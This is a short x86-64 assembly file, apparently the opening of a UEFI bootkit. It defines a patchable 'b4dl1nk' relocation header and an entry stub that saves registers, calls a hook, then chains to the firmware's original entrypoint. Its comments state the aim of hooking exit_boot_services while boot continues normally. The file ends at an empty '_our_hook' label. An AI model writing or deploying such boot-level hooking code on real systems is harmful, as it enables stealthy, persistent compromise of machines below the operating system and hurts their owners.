BITS 64


; This is a custom linking format just to make it easier to patch values in this
; directly.
_bad_link_header:
    db "b4dl1nk", 0
    dd (_bad_link_reloc_end - _bad_link_reloc_start) / 16
    dd _badlink_end

_bad_link_reloc_start:

; uefi entrypoint
    db "uefi_e", 0
    db 0x20 ; offset type, for reading
    dq _uefi_entry - _badlink_end

; bios entrypoint
; adjusted later on.
    db "bios_e", 0
    db 0x20 ; offset type for reading.
    dq 0

; original uefi entrypoint
    db "uefi_o", 0
    db 0x14
    dq _original_uefi_offset - _badlink_end

_bad_link_reloc_end:

    align 64, db 0x00

_badlink_end:

; Our goal here is to hook exit_boot_services, then continue boot as normal.
_uefi_entry:
    push rax
    push rcx
    push rdx
    push r8
    push r9
    call _our_hook
    pop r9
    pop r8
    pop rdx
    pop rcx
    pop rax

; lets call the original entrypoint
    db 0xe8
; call offset
_original_uefi_offset:
    db 0x00, 0x00, 0x00, 0x00

    align 32, db 0xff

_our_hook:
